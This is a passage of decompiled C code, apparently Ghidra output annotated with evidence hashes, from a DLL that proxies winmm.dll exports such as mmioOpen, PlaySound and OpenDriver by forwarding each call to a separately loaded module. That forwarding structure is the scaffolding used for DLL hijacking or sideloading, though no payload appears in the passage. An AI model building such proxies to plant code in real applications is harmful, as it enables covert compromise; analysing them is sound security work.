    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800031ed. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x1800031fc mmioAdvance; Evidence ev_26d170be02fe1fb4508d0cdf1acededb648e64af7af82e9fd39f93a28f9524d9 */

MMRESULT __stdcall mmioAdvance(HMMIO hmmio,LPMMIOINFO pmmioinfo,UINT fuAdvance)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x31fc  129  mmioAdvance */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioAdvance");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003244. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmmio,pmmioinfo,CONCAT44(in_register_00000084,fuAdvance));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003253 mmioAscend; Evidence ev_52592bf14816ab73c7742b21b3adfbfa8ce132629ef2a11970aafb78bd60c1ea */

MMRESULT __stdcall mmioAscend(HMMIO hmmio,LPMMCKINFO pmmcki,UINT fuAscend)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x3253  130  mmioAscend */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioAscend");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000329b. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmmio,pmmcki,CONCAT44(in_register_00000084,fuAscend));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800032aa mmioClose; Evidence ev_2ae54e4506d67ba229744dc8f9cf04926391a617f67282177dafa53371492a41 */

MMRESULT __stdcall mmioClose(HMMIO hmmio,UINT fuClose)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x32aa  131  mmioClose */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioClose");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800032f2. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmmio,CONCAT44(in_register_00000014,fuClose));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003301 mmioCreateChunk; Evidence ev_47b99b0c16d9f7e87687d2c02befa5401aab7db74b96af98d94055887337397d */

MMRESULT __stdcall mmioCreateChunk(HMMIO hmmio,LPMMCKINFO pmmcki,UINT fuCreate)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x3301  132  mmioCreateChunk */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioCreateChunk");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003349. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmmio,pmmcki,CONCAT44(in_register_00000084,fuCreate));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003358 mmioDescend; Evidence ev_e573202ba01a230d303ca93f93302437cca4c3dfbfcdece95e137f1d53d42d3d */

MMRESULT __stdcall mmioDescend(HMMIO hmmio,LPMMCKINFO pmmcki,MMCKINFO *pmmckiParent,UINT fuDescend)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000008c;
  
                    /* 0x3358  133  mmioDescend */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioDescend");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800033a0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (hmmio,pmmcki,pmmckiParent,CONCAT44(in_register_0000008c,fuDescend));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800033af mmioFlush; Evidence ev_2f3bc4c1a58f0fcaef3c6d9a1428492b6d3cef308a389d6b9870d4e5bf350104 */

MMRESULT __stdcall mmioFlush(HMMIO hmmio,UINT fuFlush)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x33af  134  mmioFlush */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioFlush");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800033f7. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmmio,CONCAT44(in_register_00000014,fuFlush));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003406 mmioGetInfo; Evidence ev_911374564fb32c98a9dd2db3c275c2e9c6267bd52a67ffae680113507d9d1b3b */

MMRESULT __stdcall mmioGetInfo(HMMIO hmmio,LPMMIOINFO pmmioinfo,UINT fuInfo)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x3406  135  mmioGetInfo */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioGetInfo");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000344e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmmio,pmmioinfo,CONCAT44(in_register_00000084,fuInfo));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000345d mmioInstallIOProcA; Evidence ev_7393890a6b1bbc790c3fbbb82fa034375606d246e1a2607abfd311c4e4ad7e93 */

LPMMIOPROC __stdcall mmioInstallIOProcA(FOURCC fccIOProc,LPMMIOPROC pIOProc,DWORD dwFlags)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  LPMMIOPROC puVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x345d  136  mmioInstallIOProcA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioInstallIOProcA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800034a5. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      puVar1 = (LPMMIOPROC)
               (*UNRECOVERED_JUMPTABLE)
                         (CONCAT44(in_register_0000000c,fccIOProc),pIOProc,
                          CONCAT44(in_register_00000084,dwFlags));
      return puVar1;
    }
  }
  return (LPMMIOPROC)0x0;
}



/* 0x1800034b4 mmioInstallIOProcW; Evidence ev_71fefdd11f0f50cc1f828499fdd8efd94ee974f5525169c5a355024dc01f2028 */

LPMMIOPROC __stdcall mmioInstallIOProcW(FOURCC fccIOProc,LPMMIOPROC pIOProc,DWORD dwFlags)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  LPMMIOPROC puVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x34b4  137  mmioInstallIOProcW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioInstallIOProcW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800034fc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      puVar1 = (LPMMIOPROC)
               (*UNRECOVERED_JUMPTABLE)
                         (CONCAT44(in_register_0000000c,fccIOProc),pIOProc,
                          CONCAT44(in_register_00000084,dwFlags));
      return puVar1;
    }
  }
  return (LPMMIOPROC)0x0;
}



/* 0x18000350b mmioOpenA; Evidence ev_e7ed44c46d0ab65a05607a5926f9d561c4bda4bbb7a9c695aa4cf0b1a7b43a92 */

HMMIO __stdcall mmioOpenA(LPSTR pszFileName,LPMMIOINFO pmmioinfo,DWORD fdwOpen)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  HMMIO pHVar1;
  undefined4 in_register_00000084;
  
                    /* 0x350b  138  mmioOpenA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioOpenA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003553. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      pHVar1 = (HMMIO)(*UNRECOVERED_JUMPTABLE)
                                (pszFileName,pmmioinfo,CONCAT44(in_register_00000084,fdwOpen));
      return pHVar1;
    }
  }
  return (HMMIO)0x0;
}



/* 0x180003562 mmioOpenW; Evidence ev_25afb503ce2d23e9ca2a28201446a236f5bafd9a8c608eab93c50bc28fc86aca */

HMMIO __stdcall mmioOpenW(LPWSTR pszFileName,LPMMIOINFO pmmioinfo,DWORD fdwOpen)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  HMMIO pHVar1;
  undefined4 in_register_00000084;
  
                    /* 0x3562  139  mmioOpenW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioOpenW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800035aa. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      pHVar1 = (HMMIO)(*UNRECOVERED_JUMPTABLE)
                                (pszFileName,pmmioinfo,CONCAT44(in_register_00000084,fdwOpen));
      return pHVar1;
    }
  }
  return (HMMIO)0x0;
}



/* 0x1800035b9 mmioRead; Evidence ev_2c558205f31f3c9ddc3c867e0a031ec66de2edaee85bb5e97748e5917a62094b */

LONG __stdcall mmioRead(HMMIO hmmio,HPSTR pch,LONG cch)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x35b9  140  mmioRead */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioRead");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003601. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmmio,pch,CONCAT44(in_register_00000084,cch));
      return (LONG)IVar1;
    }
  }
  return 0;
}



/* 0x180003610 mmioRenameA; Evidence ev_23c8af7f9d03efdf11746a5d6d717e18d396def38b9a06b4f88cbec3b8d77f04 */

MMRESULT __stdcall
mmioRenameA(LPCSTR pszFileName,LPCSTR pszNewFileName,LPCMMIOINFO pmmioinfo,DWORD fdwRename)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000008c;
  
                    /* 0x3610  141  mmioRenameA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioRenameA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003658. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (pszFileName,pszNewFileName,pmmioinfo,
                         CONCAT44(in_register_0000008c,fdwRename));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003667 mmioRenameW; Evidence ev_c24e7014b99f3f41a4efb5b8f3edc5c638f52cf036ef64b98ad69dd838fbcc9d */

MMRESULT __stdcall
mmioRenameW(LPCWSTR pszFileName,LPCWSTR pszNewFileName,LPCMMIOINFO pmmioinfo,DWORD fdwRename)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000008c;
  
                    /* 0x3667  142  mmioRenameW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioRenameW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800036af. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (pszFileName,pszNewFileName,pmmioinfo,
                         CONCAT44(in_register_0000008c,fdwRename));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800036be mmioSeek; Evidence ev_861ca8b861f65a8dea46c1ee97dbd4d5f1254f523aba1ec95768542bc8e7bbdf */

LONG __stdcall mmioSeek(HMMIO hmmio,LONG lOffset,int iOrigin)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  undefined4 in_register_00000084;
  
                    /* 0x36be  143  mmioSeek */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioSeek");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003706. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (hmmio,CONCAT44(in_register_00000014,lOffset),
                         CONCAT44(in_register_00000084,iOrigin));
      return (LONG)IVar1;
    }
  }
  return 0;
}



/* 0x180003715 mmioSendMessage; Evidence ev_1b9b4e16555801f1571ce276aa33de6ade259e42cad91be8d03877653ff22ae5 */

LRESULT __stdcall mmioSendMessage(HMMIO hmmio,UINT uMsg,LPARAM lParam1,LPARAM lParam2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x3715  144  mmioSendMessage */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioSendMessage");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000375d. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmmio,CONCAT44(in_register_00000014,uMsg),lParam1,lParam2);
      return IVar1;
    }
  }
  return 0;
}



/* 0x18000376c mmioSetBuffer; Evidence ev_6f8f81bc129bf508f9e015e3d7cd6484849bf13ac8afee4b2e44a0fcc09dcabe */

MMRESULT __stdcall mmioSetBuffer(HMMIO hmmio,LPSTR pchBuffer,LONG cchBuffer,UINT fuBuffer)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  undefined4 in_register_0000008c;
  
                    /* 0x376c  145  mmioSetBuffer */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioSetBuffer");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800037b4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (hmmio,pchBuffer,CONCAT44(in_register_00000084,cchBuffer),
                         CONCAT44(in_register_0000008c,fuBuffer));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800037c3 mmioSetInfo; Evidence ev_e5f26f62d3e702f3457016ca030c870401d3fd201c435ccf11f1c5b7c33513b5 */

MMRESULT __stdcall mmioSetInfo(HMMIO hmmio,LPCMMIOINFO pmmioinfo,UINT fuInfo)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x37c3  146  mmioSetInfo */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioSetInfo");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000380b. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmmio,pmmioinfo,CONCAT44(in_register_00000084,fuInfo));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000381a mmioStringToFOURCCA; Evidence ev_bd48b5f9e2c603677ccc862726bce9b45a847953e590f02dbd81e1feca453f22 */

FOURCC __stdcall mmioStringToFOURCCA(LPCSTR sz,UINT uFlags)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x381a  147  mmioStringToFOURCCA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioStringToFOURCCA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003862. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(sz,CONCAT44(in_register_00000014,uFlags));
      return (FOURCC)IVar1;
    }
  }
  return 0;
}



/* 0x180003871 mmioStringToFOURCCW; Evidence ev_d21e705ea745f638cb7f908f121a431da9f5667d28a7711eeea0671043e336d2 */

FOURCC __stdcall mmioStringToFOURCCW(LPCWSTR sz,UINT uFlags)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x3871  148  mmioStringToFOURCCW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioStringToFOURCCW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800038b9. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(sz,CONCAT44(in_register_00000014,uFlags));
      return (FOURCC)IVar1;
    }
  }
  return 0;
}



/* 0x1800038c8 mmioWrite; Evidence ev_5166082cb67386b122fac0a1e761eb306ba8b1b23282b37e715b6113113d6825 */

LONG __stdcall mmioWrite(HMMIO hmmio,char *pch,LONG cch)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x38c8  149  mmioWrite */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmioWrite");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003910. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmmio,pch,CONCAT44(in_register_00000084,cch));
      return (LONG)IVar1;
    }
  }
  return 0;
}



/* 0x18000391f mmsystemGetVersion; Evidence ev_d2b948e92b6907e196c3fcba667af7935ee975c6e3d5ac214bc4a8d4a1d220e9 */

INT_PTR mmsystemGetVersion(undefined8 param_1,undefined8 param_2,undefined8 param_3,
                          undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x391f  150  mmsystemGetVersion */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmsystemGetVersion");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003967. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180003976 mmTaskBlock; Evidence ev_efe07a7d7f0310f42e26422121db96cf344938ea0fdb91570eb72cb8e9cc295d */

INT_PTR mmTaskBlock(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x3976  125  mmTaskBlock */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmTaskBlock");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800039be. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x1800039cd mmTaskCreate; Evidence ev_732cc662a83f395ed49f93fbcabc86ed69b180137df2bdcb54942c10c5da48c6 */

INT_PTR mmTaskCreate(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x39cd  126  mmTaskCreate */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmTaskCreate");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003a15. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180003a24 mmTaskSignal; Evidence ev_b7985f92fa5d4ba60cb464b57019f53b9692d44e6af6c96a1676f04abbc6434f */

INT_PTR mmTaskSignal(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x3a24  127  mmTaskSignal */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmTaskSignal");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003a6c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180003a7b mmTaskYield; Evidence ev_6d1b107e4806f38173623dfc07b4d32afdb783672a2c5c02768bf0d489be23cf */

INT_PTR mmTaskYield(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x3a7b  128  mmTaskYield */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmTaskYield");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003ac3. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180003ad2 OpenDriver; Evidence ev_714310d4db05beaf2995c5b5de71df425e0028ec10e9751e27b20feea8fd2b27 */

HDRVR __stdcall OpenDriver(LPCWSTR szDriverName,LPCWSTR szSectionName,LPARAM lParam2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  HDRVR pHVar1;
  
                    /* 0x3ad2  16  OpenDriver */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"OpenDriver");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003b1a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      pHVar1 = (HDRVR)(*UNRECOVERED_JUMPTABLE)(szDriverName,szSectionName,lParam2);
      return pHVar1;
    }
  }
  return (HDRVR)0x0;
}



/* 0x180003b29 PlaySound; Evidence ev_9634d73a443f340f865e2e8a8317c62e4c72e6d0395cdd1ea575c685bbd9fe1c */

INT_PTR PlaySound(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x3b29  17  PlaySound */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"PlaySound");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003b71. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180003b80 PlaySoundA; Evidence ev_5a02164283b8b0cadfad579574d4a0b4e0402b3e2e3ba79b06b955d0c58ffa31 */

BOOL __stdcall PlaySoundA(LPCSTR pszSound,HMODULE hmod,DWORD fdwSound)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x3b80  18  PlaySoundA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"PlaySoundA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003bc8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(pszSound,hmod,CONCAT44(in_register_00000084,fdwSound));
      return (BOOL)IVar1;
    }
  }
  return 0;
}



/* 0x180003bd7 PlaySoundW; Evidence ev_8a509433cc9c231156b43a9479e4de4afd0e3c9df664508538654b25e2e11535 */

BOOL __stdcall PlaySoundW(LPCWSTR pszSound,HMODULE hmod,DWORD fdwSound)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x3bd7  19  PlaySoundW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"PlaySoundW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003c1f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(pszSound,hmod,CONCAT44(in_register_00000084,fdwSound));
      return (BOOL)IVar1;
    }
  }
  return 0;
}



/* 0x180003c2e SendDriverMessage; Evidence ev_9073602d634f382267f3f2862bdbf33b9256740bf37d4bbbc205cd6e019e0d84 */

LRESULT __stdcall SendDriverMessage(HDRVR hDriver,UINT message,LPARAM lParam1,LPARAM lParam2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x3c2e  20  SendDriverMessage */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"SendDriverMessage");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003c76. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (hDriver,CONCAT44(in_register_00000014,message),lParam1,lParam2);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180003c85 sndPlaySoundA; Evidence ev_043d6285ae74266f3ef542452f34e00663e1ca9b0022563d6b18bd27abc97b8c */

BOOL __stdcall sndPlaySoundA(LPCSTR pszSound,UINT fuSound)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x3c85  151  sndPlaySoundA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"sndPlaySoundA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003ccd. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(pszSound,CONCAT44(in_register_00000014,fuSound));
      return (BOOL)IVar1;
    }
  }
  return 0;
}



/* 0x180003cdc sndPlaySoundW; Evidence ev_50cbe1ac782477b6894977c61441b52b934f55f9a1f96c726ea590b428deedea */

BOOL __stdcall sndPlaySoundW(LPCWSTR pszSound,UINT fuSound)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x3cdc  152  sndPlaySoundW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"sndPlaySoundW");
